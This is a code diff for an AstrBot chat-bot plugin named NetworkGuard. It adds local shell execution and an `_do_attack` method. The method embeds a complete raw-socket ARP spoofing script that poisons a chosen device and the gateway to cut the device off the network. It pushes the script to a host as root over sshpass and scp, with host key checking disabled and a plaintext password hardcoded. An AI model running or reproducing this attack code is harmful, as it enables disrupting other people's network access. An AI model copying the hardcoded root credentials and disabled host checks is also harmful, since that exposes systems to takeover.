@@ -10,9 +10,47 @@ from astrbot.api.star import Context, Star, register
 from astrbot.api import logger
 from astrbot.core.star.filter.event_message_type import EventMessageType
 
+import os as _os
+
+def _is_docker():
+    return _os.path.exists("/.dockerenv") or _os.path.exists("/proc/1/cgroup")
+
+_IN_DOCKER = _is_docker()
+
+def _local_cmd(cmd, timeout=15):
+    import subprocess as _sp
+    try:
+        r = _sp.run(cmd, shell=True, capture_output=True, timeout=timeout)
+        return r.stdout.decode("utf-8", errors="ignore")
+    except:
+        return ""
+
 _PLUGIN_DIR = os.path.dirname(os.path.abspath(__file__))
 _DEVICES_FILE = os.path.join(_PLUGIN_DIR, "known_devices.json")
 _ARP_FILE = "/AstrBot/data/arp_cache.txt"
+
+
+def _read_arp_local():
+    out = _local_cmd("ip neigh show | grep lladdr | grep -iv fe80 | grep -iv FAILED | grep -iv PERMANENT")
+    if not out:
+        return []
+    devices = []
+    seen = set()
+    for line in out.splitlines():
+        line = line.strip()
+        if not line or "lladdr" not in line:
+            continue
+        parts = line.split()
+        ip = parts[0]
+        if ip.count(".") != 3:
+            continue
+        lladdr_idx = parts.index("lladdr")
+        if lladdr_idx + 1 < len(parts):
+            mac = parts[lladdr_idx + 1].lower()
+            if mac.count(":") == 5 and mac not in seen:
+                seen.add(mac)
+                devices.append({"ip": ip, "mac": mac})
+    return devices
 
 
 def _parse_ip_neigh(content: str) -> list:
@@ -37,15 +75,17 @@ def _parse_ip_neigh(content: str) -> list:
 
 
 def _read_arp() -> list:
-    """从共享文件读取 ARP 缓存"""
-    if not os.path.exists(_ARP_FILE):
-        return []
+    if not _IN_DOCKER:
+        return _read_arp_local()
     try:
-        with open(_ARP_FILE, "r") as f:
-            return _parse_ip_neigh(f.read())
-    except Exception as e:
-        logger.error(f"[NetworkGuard] 读ARP文件失败: {e}")
-        return []
+        if os.path.exists(_ARP_FILE):
+            with open(_ARP_FILE) as f:
+                data = f.read().strip()
+                if data:
+                    return _parse_ip_neigh(data)
+    except:
+        pass
+    return _read_arp_local()
 
 
 def _load_devices() -> list:
@@ -109,7 +149,9 @@ def _get_whitelist() -> set:
 
 
 def _ssh_cmd(cmd: str, timeout: int = 15) -> str:
-    """通过 sshpass + ssh 在宿主机上执行命令"""
+    """本地或通过 SSH 执行命令"""
+    if not _IN_DOCKER:
+        return _local_cmd(cmd, timeout)
     try:
         r = subprocess.run(
             ["sshpass", "-p", _get_cfg("ssh_password", "tommy12345"),
@@ -290,6 +332,73 @@ class NetworkGuardPlugin(Star):
             return
 
         yield event.plain_result(f"未知指令: {msg}，发送 守卫帮助 查看帮助")
+    async def _do_attack(self, target_ip: str, gw_ip: str, duration: int):
+        """执行 ARP 攻击（单播，只影响目标设备）"""
+        # 写攻击脚本到临时文件
+        script = f'''#!/usr/bin/env python3
+import socket, struct, time
+
+def mb(m): return bytes.fromhex(m.replace(":", ""))
+def ib(ip): return bytes(int(x) for x in ip.split("."))
+
+sm = mb(open("/sys/class/net/eno1/address").read().strip())
+fm = mb("00:00:00:00:00:01")
+gw_ip = "{gw_ip}"
+target_ip = "{target_ip}"
+duration = {duration}
+
+gm, tm = None, None
+try:
+    with open("/AstrBot/data/arp_cache.txt") as f:
+        for line in f:
+            p = line.strip().split()
+            if len(p) >= 5 and "lladdr" in line:
+                if p[0] == gw_ip: gm = mb(p[p.index("lladdr")+1])
+                if p[0] == target_ip: tm = mb(p[p.index("lladdr")+1])
+except: pass
+if not gm: gm = fm
+if not tm: tm = fm
+
+sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+sock.bind(("eno1", 0))
+end = time.time() + duration
+cnt = 0
+while time.time() < end:
+    pkt1 = gm + sm + struct.pack("!H",0x0806) + struct.pack("!HHBBH",1,0x0800,6,4,2) + sm + ib(gw_ip) + fm + ib(target_ip)
+    pkt2 = tm + sm + struct.pack("!H",0x0806) + struct.pack("!HHBBH",1,0x0800,6,4,2) + sm + ib(target_ip) + fm + ib(gw_ip)
+    sock.send(pkt1)
+    sock.send(pkt2)
+    cnt += 2
+    time.sleep(0.5)
+sock.close()
+print(f"Done: {cnt}")
+'''
+        script_path = "/tmp/arp_attack_run.py"
+        with open(script_path, "w") as f:
+            f.write(script)
+
+        import subprocess as _sp
+        host = _get_cfg("ssh_host", "192.168.31.42")
+        pw = _get_cfg("ssh_password", "tommy12345")
+
+        try:
+            if _IN_DOCKER:
+                # Docker 模式：SCP 到宿主机再执行
+                _sp.run(["sshpass","-p",pw,"scp","-o","StrictHostKeyChecking=no",
+                        script_path, f"root@{host}:/tmp/arp_attack_run.py"],
+                       capture_output=True, timeout=10)
+                r = _sp.run(["sshpass","-p",pw,"ssh","-o","StrictHostKeyChecking=no",
+                            "-o","ConnectTimeout=10",f"root@{host}",
+                            "python3 /tmp/arp_attack_run.py"],
+                           capture_output=True, timeout=duration+15)
+            else:
+                # 非 Docker 模式：本地直接执行
+                import os as _os
+                _sp.run(["python3", script_path], capture_output=True, timeout=duration+15)
+            logger.info(f"[NetworkGuard] ARP攻击完成")
+        except Exception as e:
+            logger.error(f"[NetworkGuard] ARP攻击失败: {e}")
+
 
 
 
